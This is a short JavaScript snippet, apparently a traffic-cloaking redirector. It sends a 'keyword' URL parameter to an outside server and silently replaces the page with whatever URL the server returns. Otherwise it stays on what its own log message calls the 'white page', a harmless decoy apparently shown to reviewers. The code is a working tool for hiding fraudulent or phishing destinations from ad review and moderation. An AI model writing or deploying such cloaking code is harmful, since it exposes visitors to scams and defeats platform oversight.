(function(){
  const urlParams = new URLSearchParams(window.location.search);
  if (urlParams.has('keyword')) {
    fetch('https://backendnew-f8a1.onrender.com/api/check?keyword=' + urlParams.get('keyword'))
      .then(response => response.json())
      .then(data => {
        if (data.redirect && data.url) {
          window.location.replace(data.url);
        }
      })
      .catch(error => {
        console.log('Verification failed, staying on white page');
      });
  }
})();